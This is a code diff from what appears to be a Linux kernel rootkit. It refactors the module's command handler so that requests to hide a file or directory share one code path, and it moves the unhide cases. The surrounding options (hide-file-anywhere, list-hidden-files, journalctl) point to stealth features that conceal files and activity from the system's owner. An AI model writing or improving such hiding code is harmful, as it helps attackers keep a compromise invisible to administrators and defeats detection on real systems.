@@ -513,24 +513,6 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 }
                 break;
             case Opt_hide_file:
-                {
-                    char *s = args[0].from;
-                    struct kstat stat = {0};
-                    struct path path;
-
-                    if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
-                        /** It is filename, no problem because we have path.dentry */
-                        const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
-                        path_put(&path);
-                        fs_add_name_rw(f, stat.ino);
-                        kv_mem_free(&f);
-                    } else {
-                        if (*s != '.' && *s != '/') {
-                            fs_add_name_rw(s, stat.ino);
-                        }
-                    }
-                }
-                break;
             case Opt_hide_directory:
                 {
                     char *s = args[0].from;
@@ -541,28 +523,33 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                         /** It is filename, no problem because we have path.dentry */
                         const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
                         bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
-                        u64 parent_inode = fs_get_parent_inode(&path);
-                        fs_add_name_rw_dir(f, stat.ino, parent_inode, is_dir);
+
+                        if (is_dir) {
+                            u64 parent_inode = fs_get_parent_inode(&path);
+                            fs_add_name_rw_dir(f, stat.ino, parent_inode, is_dir);
+                        } else {
+                            fs_add_name_rw(f, stat.ino);
+                        }
                         path_put(&path);
                         kv_mem_free(&f);
-                    } else {
-                        if (*s != '.' && *s != '/') {
-                            /** add with unknown inode number */
-                            fs_add_name_rw(s, stat.ino);
-                        }
+                    } else if (*s != '.' && *s != '/') {
+                        /** add with unknown inode number */
+                        fs_add_name_rw(s, stat.ino);
                     }
                 }
                 break;
+            case Opt_unhide_file:
+            case Opt_unhide_directory:
+                 fs_del_name(args[0].from);
+                break;
+                /* Currently, directories must
+                 * be added individually: use hide-directory
+                 * */
             case Opt_hide_file_anywhere:
                 fs_add_name_rw(args[0].from, 0);
                 break;
             case Opt_list_hidden_files:
                 fs_list_names();
-                break;
-
-            case Opt_unhide_file:
-            case Opt_unhide_directory:
-                 fs_del_name(args[0].from);
                 break;
             case Opt_journalclt:
                 {
